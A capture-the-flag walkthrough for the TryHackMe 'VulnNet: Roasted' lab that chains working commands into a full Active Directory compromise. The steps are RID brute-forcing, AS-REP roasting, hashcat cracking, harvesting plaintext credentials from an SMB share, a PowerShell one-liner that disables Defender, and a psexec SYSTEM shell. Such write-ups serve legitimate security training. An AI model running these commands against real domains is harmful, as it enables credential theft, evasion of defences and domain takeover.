---
description: https://tryhackme.com/room/vulnnetroasted
---

# VulnNet: Roasted

## Nmap

```
sudo nmap 10.10.217.198 -p- -sS -sV                                                   

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-03 09:12:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Rid Brute Force

Starting off we find we have guest access to SMB and are able to enumerate users through rid brute forcing with crackmapexec.&#x20;

```
crackmapexec smb '10.10.217.198' -u 'a' -p '' -d 'vulnnet-rst.local' --rid-brute
```

![](<../../../.gitbook/assets/image (21) (3).png>)

### ASREP-Roasting

With a small list of users we run the discovered usernames against GetNPUsers.py to identify accounts with "No Pre-authentication required" (ASREP Roasting).enabled in Active Directory.

```
GetNPUsers.py 'vulnnet-rst.local'/ -usersfile ~/Desktop/users -dc-ip '10.10.217.198' -format 'hashcat' 
```

![](<../../../.gitbook/assets/image (2096).png>)

### Cracking the Hash

We discover that the user t-skid is ASREP roastable. Using hashcat we are soon able to crack the password hash using the rockyou.txt wordlist.

```
hashcat -a 0 -m 18200 ~/Desktop/hash /usr/share/wordlists/rockyou.txt -O
```

![](<../../../.gitbook/assets/image (2086).png>)

### SMB enumeration

With the new found credentials for the use t-skid we turn back to further SMB enumeration against the target Domain Controller.&#x20;

We find we are able to read within the "Scripts" share and identify the file `ResetPassword.vbs` as a file of interest.

```
smbmap -H '10.10.217.198' -u 't-skid' -p '<Password>' -d 'vulnnet-rst.local' -R
```

![](<../../../.gitbook/assets/image (11) (3) (1).png>)

### Plain Text Credentials

Using smbmap the `.vbs` file is downloaded. Upon reading the code we are able to identify alternative user credentials in plain text.

```
smbmap -H '10.10.217.198' -u 't-skid' -p '<Password>' -d 'vulnnet-rst.local' -R -A .vbs
```

![](<../../../.gitbook/assets/image (9) (3) (2).png>)

### Privilege Checking

Checking the user access level with crackmapexec we identify the user as being the Domain Administrator.

```
crackmapexec smb '10.10.217.198' -u 'a-whitehat' -p '<Password> -d 'vulnnet-rst.local'  -x "whoami /all"
```

![](<../../../.gitbook/assets/image (2090).png>)

### User flag and WinRM

With administrative capabilties we are able to login over `WinRM` with Evil-`WinRm`.

```
evil-winrm -i '10.10.217.198' -u 'a-whitehat' -p '<Password>'
```

After logging in we successfully obtain the user.txt flag. However, the system.txt flag is off limits.

![](<../../../.gitbook/assets/image (4) (2) (1) (2).png>)

### Disabling Anti-Virus

In order to obtain a SYSTEM shell we will need to ideally run `psexec.py`. Firstly, we need to disable the anti-virus on the target host as otherwise psexec.py will not be able to execute.

Run the following command within the `Evil-WinRM` session.

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true
```

### Root Flag and System shell

After disabling Microsoft Defender we are then able to externally run `psexec.py` to obtain a SYSTEM shell.

```
psexec.py vulnnet-rst.local/a-whitehat:'<Password>'@'10.10.217.198'
```

![](<../../../.gitbook/assets/image (17) (1).png>)
